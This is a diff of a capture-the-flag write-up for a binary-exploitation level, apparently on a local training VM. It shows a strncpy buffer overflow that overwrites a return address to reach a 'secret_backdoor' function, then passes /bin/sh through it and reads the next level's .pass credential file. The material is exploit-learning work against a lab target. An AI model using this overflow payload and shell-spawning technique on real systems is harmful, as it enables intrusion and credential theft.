@@ -10,7 +10,7 @@ scp -P 4242 level09@192.168.56.109:level09 binary/
 ## Buffer overflow
 
 - exploit strncpy : n = buffer[180]
-    - buffer[180] filled by username
+    - buffer[180] is filled by username
 
 ```
 (gdb) info funct secret_backdoor
@@ -29,7 +29,7 @@ $ python -c 'print "\x41" * 40 + "\xd0" + "\n" + "\x41" * 200 + "\x8c\x48\x55\x5
 |   ~Welcome to l33t-m$n ~    v1337        |
 --------------------------------------------
 >: Enter your username
->>: >: Welcome, �����������������������������������������>: Msg @Unix-Dude
+>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
 >>: >: Msg sent!
 /bin/sh
 cat /home/users/end/.pass
